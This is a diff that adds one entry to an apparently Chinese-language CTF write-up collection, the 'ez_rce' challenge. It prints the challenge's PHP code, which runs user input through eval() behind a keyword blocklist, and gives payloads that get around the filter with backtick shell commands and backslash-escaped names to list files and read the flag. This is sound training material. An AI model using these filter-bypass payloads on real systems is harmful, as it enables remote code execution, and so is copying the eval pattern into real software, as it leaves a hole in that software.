@@ -398,3 +398,39 @@ http://node5.anna.nssctf.cn:24082/orzorz.php?cxk=data://text/plain,ctrl
 ## [UUCTF 2022 新生赛]ez_rce
 >url:https://www.nssctf.cn/problem/3090
 >知识点：RCE
+
+```php
+居然都不输入参数，可恶!!!!!!!!!
+
+<?php
+## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if (!preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
+        echo '看看你输入的参数！！！不叫样子！！';echo '<br>';
+        eval($code);
+    }
+    else{
+        die("你想干什么？？？？？？？？？");
+    }
+}
+else{
+    echo "居然都不输入参数，可恶!!!!!!!!!";
+    show_source(__FILE__);
+}
+
+```
+这里将许多东西过滤掉了，比如system和pasthruh
+看了一下别人的wp，还可以用printf，而且\也没有被过滤
+构造payload
+```
+http://node5.anna.nssctf.cn:20716//?code=printf(`l\s /`);
+```
+注意这里是" ` " 不是" ' ",传入分号是因为code是作为一条php语句执行的
+![alt text](image-163.png)
+用同样的方法cat flag
+```
+http://node5.anna.nssctf.cn:20716//?code=printf(`c\at /fffffffffflagafag`);
+```
+
+![alt text](image-164.png)
